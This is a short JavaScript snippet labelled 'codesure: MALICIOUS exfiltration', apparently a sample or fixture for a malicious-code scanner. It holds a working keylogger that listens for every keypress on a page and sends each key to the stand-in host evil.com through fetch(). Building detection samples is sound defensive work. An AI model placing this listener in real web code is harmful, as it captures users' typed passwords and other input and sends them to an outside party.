// codesure: MALICIOUS exfiltration
document.addEventListener('keydown', (e) => {
  fetch('https://evil.com/keys?k=' + e.key);
});
